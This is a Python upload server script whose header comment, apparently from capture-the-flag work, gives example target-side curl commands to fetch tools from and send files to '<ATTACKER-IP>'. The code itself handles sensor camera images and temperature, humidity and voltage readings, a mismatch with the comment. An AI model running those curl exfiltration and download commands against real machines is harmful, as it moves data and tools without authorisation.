#!/usr/bin/env python3
########################################################################
#
#  Simple HTTP server that  supports file upload  for moving data around
#  between boxen on HTB. Based on a gist by bones7456, but mangled by me 
#  as I've tried  (badly) to port it to Python 3, code golf it, and make
#  It a  little more  robust. I was also able to  strip out a lot of the 
#  code trivially  because Python3 SimpleHTTPServer is  a thing, and the
#  cgi module handles multipart data nicely.
#
#  Lifted from: https://gist.github.com/UniIsland/3346170
#
#  Important to note that this tool is quick and dirty and is a good way
#  to get yourself  popped if you're leaving it  running out in the real
#  world. 
#
#  Run it on your attack box from the folder that contains your tools.
#
#  From the target machine:
#  Infil file: curl -O http://<ATTACKER-IP>:44444/<FILENAME>
#  Exfil file: curl -F 'file=@<FILENAME>' http://<ATTACKER-IP>:44444/
# 
#  Multiple file upload supported, just add more -F 'file=@<FILENAME>'
#  parameters to the command line.
#
########################################################################
import http.server
import socketserver
import io
import cgi
from datetime import datetime
from datetime import timedelta
import urllib
import struct

# Change this to serve on a different port
PORT = 8000


IMAGE_DIR="cam-uploads"
DATA_FILE="cam-uploads/data.csv"

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):

    def do_POST(self):        
        r, info = self.deal_post_data()
        print(r, info, "by: ", self.client_address)
        f = io.BytesIO()
        if r:
            f.write(b"Success\n")
        else:
            f.write(b"Failed\n")
        length = f.tell()
        f.seek(0)
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", str(length))
        self.end_headers()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def deal_post_data(self):
        content_length = int(self.headers['Content-Length'])
        url = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(url.query)
        print("URL {}".format(url))
        print("Query {}".format(qs))
        

        if url.path == "/image":


            temp = int(qs.get('t',[-1])[0])
            hum = int(qs.get('h',[-1])[0])
            volts = int(qs.get('v',[-1])[0])
            filename = "{}/{}_T{}_H{}_V{}.jpg".format(IMAGE_DIR, datetime.now().timestamp(), temp, hum, volts)

            with open(filename, "wb") as f:
                f.write(self.rfile.read(content_length))

        elif url.path == "/data":

            bin_data = self.rfile.read(content_length)

            # r_time, r_voltage, r_temperature, r_humidity
            records = []

            for offset in range(0, len(bin_data), 8):
                # Binary data
                records.append(struct.unpack_from("<LHBB", bin_data, offset))

            # Time the sensor has been up, in seconds
            uptime = int(qs.get('t')[0])

            # Real time the sensor started
            start_time = datetime.now() - timedelta(seconds=uptime)

            with open(DATA_FILE, "a") as f:
                for r_time, r_voltage, r_temperature, r_humidity in records:

                    # Real time this reading was made
                    time2 = start_time + timedelta(seconds=r_time)

                    line = "{},{},{},{}\n".format(time2.isoformat().replace("T", " "), r_voltage, r_temperature, r_humidity)

                    print("New record: {}".format(line))

                    f.write(line)

        return (True, "Files uploaded")

Handler = CustomHTTPRequestHandler
socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.timeout = 10
    httpd.serve_forever()
